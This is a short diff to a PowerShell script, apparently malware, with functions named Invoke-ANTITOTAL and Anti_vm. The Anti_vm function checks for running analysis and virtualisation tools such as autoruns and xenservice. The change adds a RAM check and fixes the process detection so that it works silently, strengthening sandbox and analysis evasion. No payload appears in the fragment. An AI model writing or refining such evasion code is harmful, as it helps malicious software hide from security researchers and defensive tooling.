@@ -66,6 +66,7 @@ function Invoke-ANTITOTAL {
 }
 
 function Anti_vm {
+    ram_check
     $processnames= @(
             "autoruns",
             "autorunsc",
@@ -113,8 +114,8 @@ function Anti_vm {
             "xenservice"
         )
     $detectedProcesses = $processnames | ForEach-Object {
-        $processName = $_ | Out-Null
-        if (Get-Process -Name $processName) {
+        $processName = $_
+        if (Get-Process -Name $processName -ErrorAction SilentlyContinue) {
             $processName | Out-Null
         }
     }
